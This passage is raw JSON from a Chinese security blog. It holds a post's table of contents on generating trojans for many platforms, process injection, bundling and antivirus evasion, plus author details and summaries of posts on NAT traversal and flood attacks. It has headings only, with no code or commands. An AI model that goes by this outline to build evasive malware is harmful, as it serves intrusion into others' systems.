class=\"toc-text\">1. 功能介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">2. 攻击载荷分类</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E5%8F%82%E6%95%B0%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">3. 参数介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80\"><span class=\"toc-text\">4. 小试牛刀</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">5. 进程注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6-%E7%A8%8B%E5%BA%8F%E6%8D%86%E7%BB%91\"><span class=\"toc-text\">6. 程序捆绑</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7-%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80\"><span class=\"toc-text\">7. 木马免杀</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%90%84%E7%B1%BB%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">二、各类木马</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-Linux\"><span class=\"toc-text\">1.  Linux</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-Windows\"><span class=\"toc-text\">2.  Windows</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-Mac\"><span class=\"toc-text\">3. Mac</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-%E5%AE%89%E5%8D%93app\"><span class=\"toc-text\">4. 安卓app</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-BASH\"><span class=\"toc-text\">5.  BASH</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#6-PERL\"><span class=\"toc-text\">6. PERL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#7-C\"><span class=\"toc-text\">7. C</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#8-Python\"><span class=\"toc-text\">8. Python</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#9-ASP\"><span class=\"toc-text\">9. ASP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#10-PHP\"><span class=\"toc-text\">10. PHP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#11-JSP\"><span class=\"toc-text\">11. JSP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#12-PowerShell\"><span class=\"toc-text\">12. PowerShell</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%85%8D%E6%9D%80ShellCode\"><span class=\"toc-text\">三、免杀ShellCode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E6%94%AF%E6%8C%81%E7%9A%84%E6%BA%90%E7%A0%81%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">1.  支持的源码格式</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E7%94%9F%E6%88%90C%E8%AF%AD%E8%A8%80%E7%9A%84ShellCode\"><span class=\"toc-text\">2. 生成C语言的ShellCode</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E7%BC%96%E8%AF%91shellcode-c\"><span class=\"toc-text\">3.  编译shellcode.c</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9B%9B%E3%80%81%E5%9C%A8%E7%BA%BF%E6%9F%A5%E6%9D%80%E5%B9%B3%E5%8F%B0\"><span class=\"toc-text\">四、在线查杀平台</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-Virus-Total\"><span class=\"toc-text\">1.  Virus Total</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-VirSCAN\"><span class=\"toc-text\">2. VirSCAN</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-Jotti\"><span class=\"toc-text\">3. Jotti</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-kaspersky\"><span class=\"toc-text\">4.  kaspersky</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-%E8%85%BE%E8%AE%AF%E5%93%88%E5%8B%83%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F\"><span class=\"toc-text\">5.  腾讯哈勃分析系统</span></a></li></ol></li></ol>","author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"mapped":true,"prev_post":{"title":"内网穿透","uid":"6f6e74f284af1d44cd531a6b40059037","slug":"内网穿透","date":"2022-08-28T07:51:03.000Z","updated":"2022-08-28T12:58:26.334Z","comments":true,"path":"api/articles/内网穿透.json","keywords":null,"cover":"https://img0.baidu.com/it/u=114685654,302008310&fm=253&fmt=auto&app=138&f=JPG?w=804&h=350","text":" ​ 内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。 一、端口转发壹、 netsh端口转发 ​ 通过利用本客户机端口映射到服务器端口来工作。多数情况下，这一过程对连接的两端而言都是...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"工具使用","slug":"网络安全/工具使用","count":3,"path":"api/categories/网络安全/工具使用.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"工具使用","slug":"工具使用","count":3,"path":"api/tags/工具使用.json"}],"author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}},"feature":true},"next_post":{"title":"常见的泛洪攻击","uid":"f7d232a5ab9feede8dda296a58233a54","slug":"常见的泛洪攻击","date":"2022-08-25T07:51:03.000Z","updated":"2022-08-25T11:30:49.004Z","comments":true,"path":"api/articles/常见的泛洪攻击.json","keywords":null,"cover":"https://img1.baidu.com/it/u=2176445867,2405631310&fm=253&fmt=auto&app=138&f=JPEG?w=443&h=249","text":"一、 什么是泛洪​ 攻击者向某些网络资源发送大量的数据时发生的就是泛洪攻击。通过发起过量数据消耗网络设备的带宽、资源，导致网络设备无法提供正常服务。 二、 泛洪攻击常见种类1. TCP SYN 泛洪攻击​ 在 TCP 的 3 次握手期间，当接收端收到来自发送端的初始 SYN 报文...","link":"","photos":[],"count_time":{"symbolsCount":"4.9k","symbolsTime":"4 mins."},"categories":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/categories/网络安全.json"},{"name":"网络原理","slug":"网络安全/网络原理","count":2,"path":"api/categories/网络安全/网络原理.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":11,"path":"api/tags/网络安全.json"},{"name":"网络原理","slug":"网络原理","count":2,"path":"api/tags/网络原理.json"}],"author":{"name":"Kcxuao","slug":"blog-author","avatar":"https://img.gejiba.com/images/d12fcf0171d543a357ba257c1187033f.webp","link":"/","description":"路漫漫其修远兮，吾将上下而求索","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"qq":{"icon":"/img/qq.png","link":"http://wpa.qq.com/msgrd?v=3&uin=3187294487&site=qq&menu=yes"},"github":{"icon":"/img/github.png","link":"https://github.com/Kcxuao"},"email":{"icon":"/img/email.png","link":"mailto:kcxuao@gmail.com"}}}}}}